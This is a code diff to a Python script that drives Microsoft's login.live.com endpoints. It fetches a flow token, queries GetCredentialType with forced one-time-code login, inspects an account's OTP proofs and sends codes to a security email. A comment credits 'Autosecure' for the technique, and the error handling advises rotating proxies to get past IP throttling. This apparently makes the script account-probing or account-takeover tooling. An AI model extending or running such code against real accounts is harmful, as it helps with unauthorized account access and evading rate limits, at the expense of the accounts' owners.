@@ -51,7 +51,13 @@ def get_live_data(session: httpx.Client) -> dict:
     return {"urlPost": url_post.group(0), "ppft": ppft.group(1)}
 
 
-def send_auth(session: httpx.Client, email: str) -> dict:
+def send_auth(session: httpx.Client, email: str, flow_token: str = "") -> dict:
+    # Warm session + real PPFT first (Autosecure used a flow token; empty often returns ErrorHR only)
+    if not flow_token:
+        try:
+            flow_token = get_live_data(session)["ppft"]
+        except Exception:
+            flow_token = ""
     r = session.post(
         "https://login.live.com/GetCredentialType.srf",
         headers={
@@ -65,6 +71,7 @@ def send_auth(session: httpx.Client, email: str) -> dict:
             "checkPhones": True,
             "country": "",
             "federationFlags": 3,
+            "flowToken": flow_token or None,
             "forceotclogin": True,
             "isCookieBannerShown": True,
             "isExternalFederationDisallowed": True,
@@ -78,7 +85,10 @@ def send_auth(session: httpx.Client, email: str) -> dict:
             "username": email,
         },
     )
-    return r.json()
+    try:
+        return r.json()
+    except Exception:
+        return {"_http": r.status_code, "_body": (r.text or "")[:300]}
 
 
 def send_ott(session: httpx.Client, email: str, security_email: str) -> tuple[bool, str]:
@@ -212,18 +222,21 @@ def main() -> None:
     try:
         with get_session() as session:
             info = send_auth(session, email)
-            if len(info) == 1:
-                print(
-                    json.dumps(
-                        {
-                            "ok": False,
-                            "error": "Email OTP cooldown — wait a few minutes and try again.",
-                        }
-                    )
-                )
-                return
+            keys = list(info.keys()) if isinstance(info, dict) else []
+            # Real cooldown / throttle signals — NOT "any 1-key JSON" (that was a false positive)
+            err_hr = str(info.get("ErrorHR") or info.get("error") or "")
             if "Credentials" not in info:
-                print(json.dumps({"ok": False, "error": "Email does not exist / no credentials"}))
+                # ErrorHR-only or empty — often bad session / throttle / invalid email
+                msg = "Microsoft GetCredentialType failed"
+                if err_hr:
+                    msg += f" (ErrorHR={err_hr})"
+                if keys == ["ErrorHR"] or (len(keys) == 1 and "Error" in keys[0]):
+                    msg += " — likely IP throttle or bad flow token. Rotate proxy / wait."
+                elif not keys:
+                    msg += " — empty response"
+                else:
+                    msg += f" — keys={keys[:8]}"
+                print(json.dumps({"ok": False, "error": msg, "rawKeys": keys}))
                 return
             creds = info["Credentials"]
             if "RemoteNgcParams" in creds and creds["RemoteNgcParams"]:
@@ -231,7 +244,16 @@ def main() -> None:
                 return
             proofs = creds.get("OtcLoginEligibleProofs") or []
             if not proofs:
-                print(json.dumps({"ok": False, "error": "No email OTP proofs"}))
+                # PrefCredential / HasPassword without OTC proofs
+                pref = creds.get("PrefCredential")
+                print(
+                    json.dumps(
+                        {
+                            "ok": False,
+                            "error": f"No email OTP proofs (PrefCredential={pref}). Account may need password-only login.",
+                        }
+                    )
+                )
                 return
             selected = proofs[0]
             ver_email = selected.get("display") or "unknown"
